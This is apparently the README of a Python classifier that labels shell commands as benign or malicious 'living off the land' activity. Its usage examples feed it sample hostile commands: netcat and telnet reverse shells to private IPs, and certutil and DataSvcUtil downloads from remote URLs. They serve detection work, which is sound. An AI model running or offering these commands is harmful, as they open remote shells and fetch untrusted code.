# Living of the Land Classifier

This repository contains the source code and pre-trained models for the Living of the Land Classifier, designed by the Security Intelligence (SI) Team of the Security Coordination Center (SCC) @ Adobe.

## Quick start guide 

If you have experience with python and are eager to get started, check the [Quick start Jupyter Notebook](examples/01_quick_start.ipynb), instead of this documentation.

To get the library up and running in no time, use the following tutorial. If you want to build you own model, please refer to the ["Advanced usage and documentation"](#advanced-usage-and-documentation) section (below).


### Prerequisites

Before you proceed, make sure your system meets the following requirements:

* **Python 3.7+** installed and running on your system
* **PIP** package installer
* We recommend using a **virtual environment**. See the [official documentation](https://docs.python.org/3/library/venv.html) for details

### Quick installation

The easiest way to get LOL running is to use the `pip`:

You can use the following command directly on your system or in the virtual environment (recommended):

```bash
$ pip install lolc
```

To test the installation you can use the following scripts or `ipython` commands, which are also in the [Quick start Jupyter Notebook](examples/01_quick_start.ipynb):

#### LINUX

```python
from lol.api import LOLC, PlatformType
lolc=LOLC(PlatformType.LINUX) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS
commands=['nc -nlvp 1234 & nc -e /bin/bash 10.20.30.40 4321',
          'iptables -t nat -L -n',
          'telnet 10.20.30.40 5000 | /bin/sh | 10.20.30.50 5001']
classification, tags = lolc(commands)
for command, status, tag in zip (commands, classification, tags):
    print(command)
    print(status)
    print(tag)
    print("\n")
```

The output should be:

```text
nc -nlvp 1234 & nc -e /bin/bash 10.20.30.40 4321
BAD
IP_PRIVATE PATH_/BIN/BASH COMMAND_NC KEYWORD_-NLVP KEYWORD_-E nc_listener_to_shell LOOKS_LIKE_KNOWN_LOL

iptables -t nat -L -n
GOOD
COMMAND_IPTABLES KEYWORD_-T KEYWORD_-L KEYWORD_-N iptables_list

telnet 10.20.30.40 5000 | /bin/sh | 10.20.30.50 5001
BAD
IP_PRIVATE PATH_/BIN/SH COMMAND_TELNET telnet_sh LOOKS_LIKE_KNOWN_LOL
```

#### WINDOWS

```python
from lol.api import LOLC, PlatformType
lolc=LOLC(PlatformType.WINDOWS) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS
commands=['certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt',
          'explorer.exe c:\\temp',
          'DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile']
classification, tags = lolc(commands)
for command, status, tag in zip (commands, classification, tags):
    print(command)
    print(status)
    print(tag)
    print("\n")
```

The output should be:

```text
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
BAD
COMMAND_CERTUTIL.EXE KEYWORD_dash_urlcache KEYWORD_dash_f KEYWORD_http certutil_downloader powershell_file

explorer.exe c:\temp
NEUTRAL
# this line is empty

DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile
BAD
IP_PUBLIC COMMAND_DATASVCUTIL DataSvcUtil_http KEYWORD_http
```

## Advanced usage and documentation

This documentation is still under development. We will provide complete examples accompanied by Jupyter Notebooks.

## Installation via GitHub (for advanced usage)
```bash
git clone git@github.com:adobe/libLOL.git
cd libLOL
virtualenv -p `which python3` venv
source venv/bin/activate
pip3 install -r requirements.txt
```

